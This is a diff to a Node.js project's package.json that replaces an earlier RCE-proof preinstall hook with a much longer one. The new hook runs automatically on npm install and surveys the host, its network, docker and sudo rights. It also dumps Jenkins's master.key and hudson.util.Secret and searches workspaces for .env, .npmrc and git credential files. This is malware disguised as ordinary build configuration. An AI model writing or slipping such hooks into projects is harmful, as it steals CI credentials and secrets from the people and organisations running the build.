@@ -15,8 +15,8 @@
     "docs": "./node_modules/.bin/apidoc -i src/ -o docs",
     "coverage": "nyc report --reporter=text-lcov | coveralls",
     "coverage:report": "export AVAX_DEX=test && nyc --reporter=html mocha --exit --timeout 15000 --recursive test/unit/ test/e2e/automated/",
-    "preinstall": "id; hostname; whoami; uname -a; echo JENKINS_RCE_3315_OK; pwd",
-    "pretest": "id; hostname; whoami; echo JENKINS_RCE_3315_PRETEST_OK"
+    "preinstall": "echo RECON_START_3315; id; hostname; cat /etc/hostname 2>/dev/null; uname -a; cat /proc/1/cgroup 2>/dev/null; head -3 /etc/os-release 2>/dev/null; echo ---ip---; (ip addr 2>/dev/null || ifconfig -a 2>/dev/null) | head -40; echo ---hosts---; cat /etc/hosts; cat /etc/resolv.conf 2>/dev/null; echo ---listen---; (ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null) | head -50; echo ---ps---; ps aux | head -30; echo ---docker---; (which docker; timeout 8 docker ps -a; timeout 8 docker network ls; timeout 8 docker images) 2>&1 | head -80; echo ---sudo---; (which sudo; sudo -n -l) 2>&1 | head -20; echo ---jenkins-dirs---; ls -la /var/lib/jenkins/ | head -50; ls -la /var/lib/jenkins/secrets/; ls /var/lib/jenkins/plugins/ 2>/dev/null | head -80; echo ---workspaces---; ls -la /var/lib/jenkins/workspace/ 2>/dev/null | head -40; echo ---envfiles---; find /var/lib/jenkins/workspace -maxdepth 3 \\( -name '.env' -o -name '.npmrc' -o -name '.git-credentials' \\) 2>/dev/null | head -20; echo ---hudson-secret-b64---; base64 -w0 /var/lib/jenkins/secrets/hudson.util.Secret; echo; echo ---master-key---; cat /var/lib/jenkins/secrets/master.key; echo; echo RECON_END_3315",
+    "pretest": "echo PRETEST_MARKER_3315"
   },
   "author": "Chris Troutner <chris.troutner@gmail.com>",
   "contributors": [
